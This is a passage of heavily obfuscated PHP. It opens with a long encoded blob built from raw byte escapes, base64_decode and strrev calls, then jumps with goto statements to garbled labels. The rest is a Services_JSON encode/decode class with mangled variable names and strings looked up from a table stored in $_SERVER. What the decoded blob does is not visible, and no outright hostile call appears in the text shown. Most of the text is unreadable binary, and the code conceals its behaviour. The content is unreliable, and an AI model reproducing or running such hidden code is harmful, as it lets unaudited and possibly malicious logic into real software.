óĞò\\;0ÇìÔÑ,_é').base64_decode('0wYsajGLf6dsOgXSFo7HFDOICIQIMHyfZSsQIPJcAw5pIiSBEPm7dYJUBXE9pjg0ZdtQyuC4yh96EA==').strrev('•Â= ¢Õõš˜§L(•‚¯’2{\'OFCGt‰’úl/)4âAP%÷Å¡G…¯2ÙsA˜{ƒ').strrev('+?àr$KÒÉ˜Œ¢'."\r".'…>&<˜yOx_EğT5ÙsÓ"Û'."\n".'¤6İœâ'."\0".'ö)O`OFÜâëe').base64_decode('rKx8EeWhXmrGAiPC0SPaarDErLgLga+u4RAVpVkt0GJQaV7hSkCiJMs7CtIFCOq5I/NymIdtSsvZKQ==')."\x6e\xd7\xf7\x88\xa\xb0\x54\xe6\x47\xbe\x93\x88\xba\xb6\x3a\x5a\x57\xbd\xbd\xc4\x54\x42\x5b\xe\x4b\x8c\x44\xb8\x68\x8f\xec\x6\x84\xfb\x4b\x14\x67\xfe\x81\xe9\x23\x7a\xf4\x6d\x3d\x99\x39\x34\x82\x9e\xa0\xd8\xe\x1e\x9f\x6f\x12\x94"."\x5c\x8e\xaf\xb0\xe2\xe3\x46\xb9\x84\xac\xbb\x0\x8d\xd\x99\xd4\x73\x5e\xa5\x88\x28\xde\x57\xd8\x34\x52\xc9\x93\x37\xa0\xa0\x26\x87\x2a\x78\xca\x82\x1d\xf\x95\xc6\x84\xc5\x4d\x10\x9\xca\xd0\x38\x87\x1\x92\x3\x53\xf6\xa4\x21\xb4".base64_decode('Z4JyJGVl4osyQabfUEu458ACyhLgPKSHpCI3sIDKeEjUsvJZgGL3ECKArzVQerDkgJ612oWNCkYyxA==')."\276\265\234\355\226\73\116\53\317\315\146\245\230\45\16\52\146\75\67\21\213\302\72\10\160\137\37\206\73\157\227\255\70\66\155\52\316\21\325\300\147\313\342\366\22\204\304\212\321\271\26\322\65\44\47\131\241\354".strrev('L'."\r".'e~ü?á%“HVÛp¹~'."\0".'À>İÈ5=}"’Ï'."\0".'‘ÃeHj«\'¿.á;ï;env"Ù”§°@ ')."\206\205\254\220\2\275\374\155\360\132\211\277\273\210\323\11\265\2\101\277\103\143\343\16\357\266\5\65\250\35\67\137\272\143\355\365\370\171\154\374\134\66\351\47\374\214\210\210\44\46\133\337\32\201\156\301\255\123"."\xa5\xad\x12\x5a\x52\xd3\xd\x1\x4d\x78\x4d\x67\x11\x7c\x3d\x1\x7\x7b\xd4\x2\x7d\xe2\x86\xcc\x0\x9a\xbd\x52\x91\x80\x44\x22\xa6\x65\x30\xa1\x4c\x4c\x5\x71\xb0\xd5\x90\xf8\xd0\xa3\xcd\x33\xde\xf\x5b\xb6\xc5\x44\x91\x4c\x4\x9".base64_decode('12LQpMLq8xglIjB905aUINzmWO/VNLqYlnG0ktotJKNc9HlE8AtfIAlwlyQoGZ9Be4ZlpmRlz9Vn2Q==')."\x60\x8\xb7\x70\x49\x44\xba\x7c\xe3\x87\x32\x26\x40\x2d\xd1\x3f\x9e\xa2\x6a\xcf\x61\x66\x55\x3d\xd5\xae\x16\x52\x76\xfc\x52\x21\xc1\xa0\x1c\x1d\xc\x46\x7b\x25\x30\x90\xce\x38\x53\xb7\xc1\x85\xf5\x87\xb3\x55\x79\x98\xdf\xc8\x70\x31"."\x39\x95\xea\x90\x87\x2b\xa0\x32\x7\x2\xc\xa\x20\xc\x15\x9\x4a\xc2\x3\x49\xdc\x59\xb6\x32\x22\x7e\x9d\xe0\xa5\xcb\x57\x1f\x88\x58\xe\xe5\xf\x28\xd9\xdb\x85\x26\x1c\x83\x93\x8b\xb1\x82\xe0\x68\x90\x90\x1b\x7\x21\x9c\x24\xf3"."\101\51\354\65\240\216\46\167\116\211\353\310\66\344\374\223\326\167\236\30\32\23\342\0\16\262\265\160\132\240\266\35\27\74\245\245\353\260\55\211\234\6\10\305\127\74\64\260\220\102\267\120\234\170\17\67\141\206"."\110\345\217\160\172\265\166\261\360\46\26\117\240\313\235\146\351\174\201\13\263\206\21\314\260\230\150\251\216\175\150\321\146\200\323\45\6\346\321\311\247\213\36\32\227\343\53\266\332\213\31\354\55\303\71\364\262\376".base64_decode('IXkqf9r+Ado99i0WL0TY6pRd0Ue1CnlwjSpmw0kwJ5fnLHmNEdVMZivmxUkwb1kyzSycbQj5TLlkTA==')."\xd0\xbc\xf2\xce\x23\x5b\xf6\x32\xae\x4\x40\xb6\xcd\x2c\x46\x9d\xa8\x3f\x2b\x22\x97\x7f\x8e\x10\x8f\x1d\x1b\xed\xf1\x2b\xd7\xa2\xe2\xd9\xca\x44\xb5\xa8\x88\x3c\x61\x2d\x38\xb6\xed\xe6\xbd\x12\x3f\xa4\x29\x15\x38\x20\xbf\x28\x2f\xe7"."\xb5\x3c\xad\xc2\xb5\x3d\x2e\x13\x2e\xc4\x61\x8b\x66\x6b\x59\xb2\xa8\x3\x50\x59\x4b\x20\x5c\x71\x16\x1b\xd6\xeb\x7b\x1b\x5c\xec\x18\xee\xda\x94\x38\x3b\x1d\x2a\x50\xef\x60\x20\x3b\xf7\xba\x9\x15\xe2\x3d\xba\xbd\x73\xa8\x14\x68\xf3"."\x63\x4d\x69\xaf\x50\x12\x7c\x27\x57\x74\x84\xed\x80\xfb\xe3\xf2\xd\x68\x8e\xfa\x8e\x13\xdd\x84\xe3\x3d\x8a\x66\xaa\x49\x41\x5d\x8\x2\x45\x4f\xd7\x38\x9d\x7e\x24\xc7\x8f\xd8\x88\x24\x80\xcf\x6b\x7c\xa2\xf6\xfb\xbb\x77\x9d\xfc\xce"."\346\353\336\271\345\252\167\316\73\145\307\371\227\72\166\236\271\161\347\206\323\167\156\70\173\307\31\127\355\270\354\172\234\260\363\27\353\336\273\354\274\271\322\316\323\117\200\211\353\117\175\373\276\273\360\277\73\256".base64_decode('vffdWx4AciJG2bHp3nc3bXznout3nnb3zkuu3HnxafT9V8vRT/kxkYufYlt8s+MFnpzg44s2pB/GLg==').base64_decode('b+BGzYHXTZwc0XQT+lwA/L6Ifts106RsCIjXCBOJgcilk6B7AEL8pgaOELo8QLSMeA4Kkis/uKmNKA==')."\x38\x15\x71\x2a\x4b\x4\x5e\x4a\xb0\x48\xb8\xfc\xf6\xa1\xa3\x64\xbb\x6c\xe4\x0\xb0\x1d\x4d\x68\xa3\x84\x94\xd0\xab\x50\xbc\x3e\xf0\x12\x81\x74\x8b\x5d\xd4\xe3\x1a\x0\x84\x96\x45\x4d\xa\xa4\xd0\x68\xb8\x71\x8a\x9b\x18\x3f\x38\x51"."\31\116\362\156\51\123\176\44\331\123\150\356\61\247\260\337\127\2\71\245\344\105\40\215\150\174\350\324\33\214\306\375\113\3\221\150\244\54\51\344\211\104\226\4\303\76\254\100\135\226\214\162\11\112\53\145\111\241".strrev('M“¦DCMè¼4ÛY‹ÎÊ·t^Bï¼²‹Tİİ=-P„'."\n".'N.´únµ@±*'."\r".',» OşiDï`®')."\x7c\x39\x46\xc9\xb3\x43\x2f\xa1\x8\xeb\xd9\x83\x38\xcc\x6\x7d\xee\x99\x5\x8a\x65\x3b\x10\x41\x78\x80\xa\x28\xbd\xa4\xb0\x30\xf5\x77\xda\xeb\x5f\xc4\x19\x7\x93\x86\x51\x83\x44\x2d\x36\x7e\x7b\xec\xb2\xdc\x32\xb\x70\x34\x59\x10"."\xfb\x12\x88\x50\x5c\x9a\x11\xa0\xae\x62\x8f\x89\xb7\xc1\xe5\xb7\x1\x28\x95\x77\x1\xac\xe9\xb1\xd4\xc3\xc9\xa0\x96\x10\x4e\xfb\x31\x4f\xb3\x70\x33\x51\xeb\x8\x87\x49\xf2\xff\x1\xee\xa3\xce\xac\x98\xc8\x0\x0".""."", 10, -8))); goto ağíè†›ŠÄ; d¡Æ¾ôô³ù: define($_SERVER[ã®Â„Éæ¹¤][1960], 32); class Services_JSON { function __construct($BİÛ«›ï×× = 0) { $this->use = $BİÛ«›ï××; } function utf162utf8($dôî‡Ÿ£ñ) { $C²Ş“’àŠä =& $_SERVER[ã®Â„Éæ¹¤]; if (function_exists($C²Ş“’àŠä[68])) { return mb_convert_encoding($dôî‡Ÿ£ñ, $C²Ş“’àŠä[1609], $C²Ş“’àŠä[1961]); } $d¯õÏó‹ËÔ = ord($dôî‡Ÿ£ñ[0]) << 8 | ord($dôî‡Ÿ£ñ[1]); switch (!0) { case (127 & $d¯õÏó‹ËÔ) == $d¯õÏó‹ËÔ: return chr(127 & $d¯õÏó‹ËÔ); case (2047 & $d¯õÏó‹ËÔ) == $d¯õÏó‹ËÔ: return chr(192 | $d¯õÏó‹ËÔ >> 6 & 31) . chr(128 | $d¯õÏó‹ËÔ & 63); case (65535 & $d¯õÏó‹ËÔ) == $d¯õÏó‹ËÔ: return chr(224 | $d¯õÏó‹ËÔ >> 12 & 15) . chr(128 | $d¯õÏó‹ËÔ >> 6 & 63) . chr(128 | $d¯õÏó‹ËÔ & 63); } return $C²Ş“’àŠä[33]; } function utf82utf16($eï‡Ô›Š±ù) { $FŸ„ùˆœ¡ =& $_SERVER[ã®Â„Éæ¹¤]; if (function_exists($FŸ„ùˆœ¡[68])) { return mb_convert_encoding($eï‡Ô›Š±ù, $FŸ„ùˆœ¡[1961], $FŸ„ùˆœ¡[1609]); } switch (strlen($eï‡Ô›Š±ù)) { case 1: return $eï‡Ô›Š±ù; case 2: return chr(7 & ord($eï‡Ô›Š±ù[0]) >> 2) . chr(192 & ord($eï‡Ô›Š±ù[0]) << 6 | 63 & ord($eï‡Ô›Š±ù[1])); case 3: return chr(240 & ord($eï‡Ô›Š±ù[0]) << 4 | 15 & ord($eï‡Ô›Š±ù[1]) >> 2) . chr(192 & ord($eï‡Ô›Š±ù[1]) << 6 | 127 & ord($eï‡Ô›Š±ù[2])); } return $FŸ„ùˆœ¡[33]; } function encode($F†Û…ã¤ÀÛ) { $dˆˆ×ù¦¢Œ =& $_SERVER[ã®Â„Éæ¹¤]; switch (gettype($F†Û…ã¤ÀÛ)) { case $dˆˆ×ù¦¢Œ[1620]: return $F†Û…ã¤ÀÛ ? $dˆˆ×ù¦¢Œ[1619] : $dˆˆ×ù¦¢Œ[1621]; case $dˆˆ×ù¦¢Œ[1962]: return $dˆˆ×ù¦¢Œ[99]; case $dˆˆ×ù¦¢Œ[303]: return (int) $F†Û…ã¤ÀÛ; case $dˆˆ×ù¦¢Œ[278]: case $dˆˆ×ù¦¢Œ[277]: return (double) $F†Û…ã¤ÀÛ; case $dˆˆ×ù¦¢Œ[312]: $BÁ§ê·‰ŠÔ = $dˆˆ×ù¦¢Œ[33]; $AŸŠÜÍ ø½ = strlen($F†Û…ã¤ÀÛ); for ($E§©Œ›êŒ = 0; $E§©Œ›êŒ < $AŸŠÜÍ ø½; ++$E§©Œ›êŒ) { $EÍÅ¤™š×– = ord($F†Û…ã¤ÀÛ[$E§©Œ›êŒ]); switch (!0) { case $EÍÅ¤™š×– == 8: $BÁ§ê·‰ŠÔ .= $dˆˆ×ù¦¢Œ[1963]; break; case $EÍÅ¤™š×– == 9: $BÁ§ê·‰ŠÔ .= $dˆˆ×ù¦¢Œ[1596]; break; case $EÍÅ¤™š×– == 10: $BÁ§ê·‰ŠÔ .= $dˆˆ×ù¦¢Œ[1594]; break; case $EÍÅ¤™š×– == 12: $BÁ§ê·‰ŠÔ .= $dˆˆ×ù¦¢Œ[1964]; break; case $EÍÅ¤™š×– == 13: $BÁ§ê·‰ŠÔ .= $dˆˆ×ù¦¢Œ[1595]; break; case $EÍÅ¤™š×– == 34: case $EÍÅ¤™š×– == 47: case $EÍÅ¤™š×– == 92: $BÁ§ê·‰ŠÔ .= $dˆˆ×ù¦¢Œ[93] . $F†Û…ã¤ÀÛ[$E§©Œ›êŒ]; break; case $EÍÅ¤™š×– >= 32 && $EÍÅ¤™š×– <= 127: $BÁ§ê·‰ŠÔ .= $F†Û…ã¤ÀÛ[$E§©Œ›êŒ]; break; case ($EÍÅ¤™š×– & 224) == 192: $fâù÷Ç¼Ê = pack($dˆˆ×ù¦¢Œ[1965], $EÍÅ¤™š×–, ord($F†Û…ã¤ÀÛ[$E§©Œ›êŒ + 1])); $E§©Œ›êŒ += 1; $FÚ•öĞì = $this->utf82utf16($fâù÷Ç¼Ê); $BÁ§ê·‰ŠÔ .= sprintf($dˆˆ×ù¦¢Œ[1966], bin2hex($FÚ•öĞì)); break; case ($EÍÅ¤™š×– & 240) == 224: $fâù÷Ç¼Ê = pack($dˆˆ×ù¦¢Œ[1965], $EÍÅ¤™š×–, ord($F†Û…ã¤ÀÛ[$E§©Œ›êŒ + 1]), ord($F†Û…ã¤ÀÛ[$E§©Œ›êŒ + 2])); $E§©Œ›êŒ += 2; $FÚ•öĞì = $this->utf82utf16($fâù÷Ç¼Ê); $BÁ§ê·‰ŠÔ .= sprintf($dˆˆ×ù¦¢Œ[1966], bin2hex($FÚ•öĞì)); break; case ($EÍÅ¤™š×– & 248) == 240: $fâù÷Ç¼Ê = pack($dˆˆ×ù¦¢Œ[1965], $EÍÅ¤™š×–, ord($F†Û…ã¤ÀÛ[$E§©Œ›êŒ + 1]), ord($F†Û…ã¤ÀÛ[$E§©Œ›êŒ + 2]), ord($F†Û…ã¤ÀÛ[$E§©Œ›êŒ + 3])); $E§©Œ›êŒ += 3; $FÚ•öĞì = $this->utf82utf16($fâù÷Ç¼Ê); $BÁ§ê·‰ŠÔ .= sprintf($dˆˆ×ù¦¢Œ[1966], bin2hex($FÚ•öĞì)); break; case ($EÍÅ¤™š×– & 252) == 248: $fâù÷Ç¼Ê = pack($dˆˆ×ù¦¢Œ[1965], $EÍÅ¤™š×–, ord($F†Û…ã¤ÀÛ[$E§©Œ›êŒ + 1]), ord($F†Û…ã¤ÀÛ[$E§©Œ›êŒ + 2]), ord($F†Û…ã¤ÀÛ[$E§©Œ›êŒ + 3]), ord($F†Û…ã¤ÀÛ[$E§©Œ›êŒ + 4])); $E§©Œ›êŒ += 4; $FÚ•öĞì = $this->utf82utf16($fâù÷Ç¼Ê); $BÁ§ê·‰ŠÔ .= sprintf($dˆˆ×ù¦¢Œ[1966], bin2hex($FÚ•öĞì)); break; case ($EÍÅ¤™š×– & 254) == 252: $fâù÷Ç¼Ê = pack($dˆˆ×ù¦¢Œ[1965], $EÍÅ¤™š×–, ord($F†Û…ã¤ÀÛ[$E§©Œ›êŒ + 1]), ord($F†Û…ã¤ÀÛ[$E§©Œ›êŒ + 2]), ord($F†Û…ã¤ÀÛ[$E§©Œ›êŒ + 3]), ord($F†Û…ã¤ÀÛ[$E§©Œ›êŒ + 4]), ord($F†Û…ã¤ÀÛ[$E§©Œ›êŒ + 5])); $E§©Œ›êŒ += 5; $FÚ•öĞì = $this->utf82utf16($fâù÷Ç¼Ê); $BÁ§ê·‰ŠÔ .= sprintf($dˆˆ×ù¦¢Œ[1966], bin2hex($FÚ•öĞì)); break; } } return $dˆˆ×ù¦¢Œ[113] . $BÁ§ê·‰ŠÔ . $dˆˆ×ù¦¢Œ[113]; case $dˆˆ×ù¦¢Œ[1967]: if (is_array($F†Û…ã¤ÀÛ) && count($F†Û…ã¤ÀÛ) && array_keys($F†Û…ã¤ÀÛ) !== range(0, sizeof($F†Û…ã¤ÀÛ) - 1)) { $EÕ“åñˆ›¥ = array_map(array($this, $dˆˆ×ù¦¢Œ[1968]), array_keys($F†Û…ã¤ÀÛ), array_values($F†Û…ã¤ÀÛ)); foreach ($EÕ“åñˆ›¥ as $bßŠÏÍ¬Œ) { if (Services_JSON::isError($bßŠÏÍ¬Œ)) { return $bßŠÏÍ¬Œ; } } return $dˆˆ×ù¦¢Œ[1087] . join($dˆˆ×ù¦¢Œ[47], $EÕ“åñˆ›¥) . $dˆˆ×ù¦¢Œ[315]; } $f×ßĞÀõ¦˜ = array_map(array($this, $dˆˆ×ù¦¢Œ[1969]), $F†Û…ã¤ÀÛ); foreach ($f×ßĞÀõ¦˜ as $dçíÃ¯”°) { if (Services_JSON::isError($dçíÃ¯”°)) { return $dçíÃ¯”°; } } return $dˆˆ×ù¦¢Œ[157] . join($dˆˆ×ù¦¢Œ[47], $f×ßĞÀõ¦˜) . $dˆˆ×ù¦¢Œ[478]; case $dˆˆ×ù¦¢Œ[1970]: $dá˜ğØÆöì = get_object_vars($F†Û…ã¤ÀÛ); $EÕ“åñˆ›¥ = array_map(array($this, $dˆˆ×ù¦¢Œ[1968]), array_keys($dá˜ğØÆöì), array_values($dá˜ğØÆöì)); foreach ($EÕ“åñˆ›¥ as $bßŠÏÍ¬Œ) { if (Services_JSON::isError($bßŠÏÍ¬Œ)) { return $bßŠÏÍ¬Œ; } } return $dˆˆ×ù¦¢Œ[1087] . join($dˆˆ×ù¦¢Œ[47], $EÕ“åñˆ›¥) . $dˆˆ×ù¦¢Œ[315]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $dˆˆ×ù¦¢Œ[99] : new Services_JSON_Error(gettype($F†Û…ã¤ÀÛ) . $dˆˆ×ù¦¢Œ[1971]); } } function name_value($dÏ¯›¤ëÄ, $bã÷É®‚ƒ‹) { $DË‹„ˆµ = $this->encode($bã÷É®‚ƒ‹); if (Services_JSON::isError($DË‹„ˆµ)) { return $DË‹„ˆµ; } return $this->encode(strval($dÏ¯›¤ëÄ)) . $_SERVER[ã®Â„Éæ¹¤][4] . $DË‹„ˆµ; } function reduce_string($Fë·«Ç–„Ò) { $B†¤ ©ªİµ =& $_SERVER[ã®Â„Éæ¹¤]; $Fë·«Ç–„Ò = preg_replace(array($B†¤ ©ªİµ[1972], $B†¤ ©ªİµ[1973], $B†¤ ©ªİµ[1974]), $B†¤ ©ªİµ[33], $Fë·«Ç–„Ò); return trim($Fë·«Ç–„Ò); } function decode($aŞ‰‰¢á·µ) { $bÍŞ“îõ‘î =& $_SERVER[ã®Â„Éæ¹¤]; $aŞ‰‰¢á·µ = $this->reduce_string($aŞ‰‰¢á·µ); switch (strtolower($aŞ‰‰¢á·µ)) { case $bÍŞ“îõ‘î[1619]: return !0; case $bÍŞ“îõ‘î[1621]: return !1; case $bÍŞ“îõ‘î[99]: return null; default: $b£…®Ëïö¤ = array(); if (is_numeric($aŞ‰‰¢á·µ)) { return (double) $aŞ‰‰¢á·µ == (int) $aŞ‰‰¢á·µ ? (int) $aŞ‰‰¢á·µ : (double) $aŞ‰‰¢á·µ; } elseif (preg_match($bÍŞ“îõ‘î[1975], $aŞ‰‰¢á·µ, $b£…®Ëïö¤) && $b£…®Ëïö¤[1] == $b£…®Ëïö¤[2]) { $aª×ß‘‘‹À = substr($aŞ‰‰¢á·µ, 0, 1); $b”ø×¸©‚Ï = substr($aŞ‰‰¢á·µ, 1, -1); $FÚ™¬â¾–à = $bÍŞ“îõ‘î[33]; $A…ï¨Â¼Æ = strlen($b”ø×¸©‚Ï); for ($C¤¨°õºˆ = 0; $C¤¨°õºˆ < $A…ï¨Â¼Æ; ++$C¤¨°õºˆ) { $A“µÏÀšèà = substr($b”ø×¸©‚Ï, $C¤¨°õºˆ, 2); $DËÕÎ“§ô´ = ord($b”ø×¸©‚Ï[$C¤¨°õºˆ]); switch (!0) { case $A“µÏÀšèà == $bÍŞ“îõ‘î[1963]: $FÚ™¬â¾–à .= chr(8); ++$C¤¨°õºˆ; break; case $A“µÏÀšèà == $bÍŞ“îõ‘î[1596]: $FÚ™¬â¾–à .= chr(9); ++$C¤¨°õºˆ; break; case $A“µÏÀšèà == $bÍŞ“îõ‘î[1594]: $FÚ™¬â¾–à .= chr(10); ++$C¤¨°õºˆ; break; case $A“µÏÀšèà == $bÍŞ“îõ‘î[1964]: $FÚ™¬â¾–à .= chr(12); ++$C¤¨°õºˆ; break; case $A“µÏÀšèà == $bÍŞ“îõ‘î[1595]: $FÚ™¬â¾–à .= chr(13); ++$C¤¨°õºˆ; break; case $A“µÏÀšèà == $bÍŞ“îõ‘î[1376]: case $A“µÏÀšèà == $bÍŞ“îõ‘î[1976]: case $A“µÏÀšèà == $bÍŞ“îõ‘î[1589]: case $A“µÏÀšèà == $bÍŞ“îõ‘î[1591]: if ($aª×ß‘‘‹À == $bÍŞ“îõ‘î[113] && $A“µÏÀšèà != $bÍŞ“îõ‘î[1976] || $aª×ß‘‘‹À == $bÍŞ“îõ‘î[55] && $A“µÏÀšèà != $bÍŞ“îõ‘î[1376]) { $FÚ™¬â¾–à .= $b”ø×¸©‚Ï[++$C¤¨°õºˆ]; } break; case preg_match($bÍŞ“îõ‘î[1977], substr($b”ø×¸©‚Ï, $C¤¨°õºˆ, 6)): $dÙ¶ŞèÛ÷ = chr(hexdec(substr($b”ø×¸©‚Ï, $C¤¨°õºˆ + 2, 2))) . chr(hexdec(substr($b”ø×¸©‚Ï, $C¤¨°õºˆ + 4, 2))); $FÚ™¬â¾–à .= $this->utf162utf8($dÙ¶ŞèÛ÷); $C¤¨°õºˆ += 5; break; case $DËÕÎ“§ô´ >= 32 && $DËÕÎ“§ô´ <= 127: $FÚ™¬â¾–à .= $b”ø×¸©‚Ï[$C¤¨°õºˆ]; break; case ($DËÕÎ“§ô´ & 224) == 192: $FÚ™¬â¾–à .= substr($b”ø×¸©‚Ï, $C¤¨°õºˆ, 2); ++$C¤¨°õºˆ; break; case ($DËÕÎ“§ô´ & 240) == 224: $FÚ™¬â¾–à .= substr($b”ø×¸©‚Ï, $C¤¨°õºˆ, 3); $C¤¨°õºˆ += 2; break; case ($DËÕÎ“§ô´ & 248) == 240: $FÚ™¬â¾–à .= substr($b”ø×¸©‚Ï, $C¤¨°õºˆ, 4); $C¤¨°õºˆ += 3; break; case ($DËÕÎ“§ô´ & 252) == 248: $FÚ™¬â¾–à .= substr($b”ø×¸©‚Ï, $C¤¨°õºˆ, 5); $C¤¨°õºˆ += 4; break; case ($DËÕÎ“§ô´ & 254) == 252: $FÚ™¬â¾–à .= substr($b”ø×¸©‚Ï, $C¤¨°õºˆ, 6); $C¤¨°õºˆ += 5; break; } } return $FÚ™¬â¾–à; } elseif (preg_match($bÍŞ“îõ‘î[1978], $aŞ‰‰¢á·µ) || preg_match($bÍŞ“îõ‘î[1979], $aŞ‰‰¢á·µ)) { goto c‡ö¤ñæ†·; c‡ö¤ñæ†·: if ($aŞ‰‰¢á·µ[0] == $bÍŞ“îõ‘î[157]) { $A‘Ç™ËÎŒ = array(SERVICES_JSON_IN_ARR); $A–·‹ÀîÍ¥ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $A‘Ç™ËÎŒ = array(SERVICES_JSON_IN_OBJ); $f×ÓìÊï×Ç = array(); } else { $A‘Ç™ËÎŒ = array(SERVICES_JSON_IN_OBJ); $f×ÓìÊï×Ç = new stdClass(); } } array_push($A‘Ç™ËÎŒ, array($bÍŞ“îõ‘î[1980] => SERVICES_JSON_SLICE, $bÍŞ“îõ‘î[263] => 0, $bÍŞ“îõ‘î[1981] => !1)); $b”ø×¸©‚Ï = substr($aŞ‰‰¢á·µ, 1, -1); goto D‡ˆ˜‚¦ñ÷; D‡ˆ˜‚¦ñ÷: $b”ø×¸©‚Ï = $this->reduce_string($b”ø×¸©‚Ï); if ($b”ø×¸©‚Ï == $bÍŞ“îõ‘î[33]) { if (reset($A‘Ç™ËÎŒ) == SERVICES_JSON_IN_ARR) { return $A–·‹ÀîÍ¥; } else { return $f×ÓìÊï×Ç; } } $A…ï¨Â¼Æ = strlen($b”ø×¸©‚Ï); goto bŒà›¹¯¤˜; bŒà›¹¯¤˜: for ($C¤¨°õºˆ = 0; $C¤¨°õºˆ <= $A…ï¨Â¼Æ; ++$C¤¨°õºˆ) { $c´Õ÷³›Ô = end($A‘Ç™ËÎŒ); $A“µÏÀšèà = substr($b”ø×¸©‚Ï, $C¤¨°õºˆ, 2); if ($C¤¨°õºˆ == $A…ï¨Â¼Æ || $b”ø×¸©‚Ï[$C¤¨°õºˆ] == $bÍŞ“îõ‘î[47] && $c´Õ÷³›Ô[$bÍŞ“îõ‘î[1980]] == SERVICES_JSON_SLICE) { $CöÛ¹¬ï—Ö = substr($b”ø×¸©‚Ï, $c´Õ÷³›Ô[$bÍŞ“îõ‘î[263]], $C¤¨°õºˆ - $c´Õ÷³›Ô[$bÍŞ“îõ‘î[263]]); array_push($A‘Ç™ËÎŒ, array($bÍŞ“îõ‘î[1980] => SERVICES_JSON_SLICE, $bÍŞ“îõ‘î[263] => $C¤¨°õºˆ + 1, $bÍŞ“îõ‘î[1981] => !1)); if (reset($A‘Ç™ËÎŒ) == SERVICES_JSON_IN_ARR) { array_push($A–·‹ÀîÍ¥, $this->decode($CöÛ¹¬ï—Ö)); } elseif (reset($A‘Ç™ËÎŒ) == SERVICES_JSON_IN_OBJ) { $EŒ¢²Ñ…Œí = array(); if (preg_match($bÍŞ“îõ‘î[1982], $CöÛ¹¬ï—Ö, $EŒ¢²Ñ…Œí)) { $cĞƒ¢ÇòÜÇ = $this->decode($EŒ¢²Ñ…Œí[1]); $F¬ŠĞ”ç = $this->decode($EŒ¢²Ñ…Œí[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $f×ÓìÊï×Ç[$cĞƒ¢ÇòÜÇ] = $F¬ŠĞ”ç; } else { $f×ÓìÊï×Ç->{$cĞƒ¢ÇòÜÇ} = $F¬ŠĞ”ç; } } elseif (preg_match($bÍŞ“îõ‘î[1983], $CöÛ¹¬ï—Ö, $EŒ¢²Ñ…Œí)) { $cĞƒ¢ÇòÜÇ = $EŒ¢²Ñ…Œí[1]; $F¬ŠĞ”ç = $this->decode($EŒ¢²Ñ…Œí[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $f×ÓìÊï×Ç[$cĞƒ¢ÇòÜÇ] = $F¬ŠĞ”ç; } else { $f×ÓìÊï×Ç->{$cĞƒ¢ÇòÜÇ} = $F¬ŠĞ”ç; } } } } elseif (($b”ø×¸©‚Ï[$C¤¨°õºˆ] == $bÍŞ“îõ‘î[113] || $b”ø×¸©‚Ï[$C¤¨°õºˆ] == $bÍŞ“îõ‘î[55]) && $c´Õ÷³›Ô[$bÍŞ“îõ‘î[1980]] != SERVICES_JSON_IN_STR) { array_push($A‘Ç™ËÎŒ, array($bÍŞ“îõ‘î[1980] => SERVICES_JSON_IN_STR, $bÍŞ“îõ‘î[263] => $C¤¨°õºˆ, $bÍŞ“îõ‘î[1981] => $b”ø×¸©‚Ï[$C¤¨°õºˆ])); } elseif ($b”ø×¸©‚Ï[$C¤¨°õºˆ] == $c´Õ÷³›Ô[$bÍŞ“îõ‘î[1981]] && $c´Õ÷³›Ô[$bÍŞ“îõ‘î[1980]] == SERVICES_JSON_IN_STR && (strlen(substr($b”ø×¸©‚Ï, 0, $C¤¨°õºˆ)) - strlen(rtrim(substr($b”ø×¸©‚Ï, 0, $C¤¨°õºˆ), $bÍŞ“îõ‘î[93]))) % 2 != 1) { array_pop($A‘Ç™ËÎŒ); } elseif ($b”ø×¸©‚Ï[$C¤¨°õºˆ] == $bÍŞ“îõ‘î[157] && in_array($c´Õ÷³›Ô[$bÍŞ“îõ‘î[1980]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($A‘Ç™ËÎŒ, array($bÍŞ“îõ‘î[1980] => SERVICES_JSON_IN_ARR, $bÍŞ“îõ‘î[263] => $C¤¨°õºˆ, $bÍŞ“îõ‘î[1981] => !1)); } elseif ($b”ø×¸©‚Ï[$C¤¨°õºˆ] == $bÍŞ“îõ‘î[478] && $c´Õ÷³›Ô[$bÍŞ“îõ‘î[1980]] == SERVICES_JSON_IN_ARR) { array_pop($A‘Ç™ËÎŒ); } elseif ($b”ø×¸©‚Ï[$C¤¨°õºˆ] == $bÍŞ“îõ‘î[1087] && in_array($c´Õ÷³›Ô[$bÍŞ“îõ‘î[1980]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($A‘Ç™ËÎŒ, array($bÍŞ“îõ‘î[1980] => SERVICES_JSON_IN_OBJ, $bÍŞ“îõ‘î[263] => $C¤¨°õºˆ, $bÍŞ“îõ‘î[1981] => !1)); } elseif ($b”ø×¸©‚Ï[$C¤¨°õºˆ] == $bÍŞ“îõ‘î[315] && $c´Õ÷³›Ô[$bÍŞ“îõ‘î[1980]] == SERVICES_JSON_IN_OBJ) { array_pop($A‘Ç™ËÎŒ); } elseif ($A“µÏÀšèà == $bÍŞ“îõ‘î[1984] && in_array($c´Õ÷³›Ô[$bÍŞ“îõ‘î[1980]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($A‘Ç™ËÎŒ, array($bÍŞ“îõ‘î[1980] => SERVICES_JSON_IN_CMT, $bÍŞ“îõ‘î[263] => $C¤¨°õºˆ, $bÍŞ“îõ‘î[1981] => !1)); $C¤¨°õºˆ++; } elseif ($A“µÏÀšèà == $bÍŞ“îõ‘î[1985] && $c´Õ÷³›Ô[$bÍŞ“îõ‘î[1980]] == SERVICES_JSON_IN_CMT) { array_pop($A‘Ç™ËÎŒ); $C¤¨°õºˆ++; for ($Cµ¼äÒÙ = $c´Õ÷³›Ô[$bÍŞ“îõ‘î[263]]; $Cµ¼äÒÙ <= $C¤¨°õºˆ; ++$Cµ¼äÒÙ) { $b”ø×¸©‚Ï = substr_replace($b”ø×¸©‚Ï, $bÍŞ“îõ‘î[50], $Cµ¼äÒÙ, 1); } } } if (reset($A‘Ç™ËÎŒ) == SERVICES_JSON_IN_ARR) { return $A–·‹ÀîÍ¥; } elseif (reset($A‘Ç™ËÎŒ) == SERVICES_JSON_IN_OBJ) { return $f×ÓìÊï×Ç; } goto BÜÒ´ÇÁ¸å; BÜÒ´ÇÁ¸å: } } } function isError($E­¹ãÍ¯ÈÄ, $Aº§Öß²ä¦ = null) { $EÀ¿½ÙÍœ =& 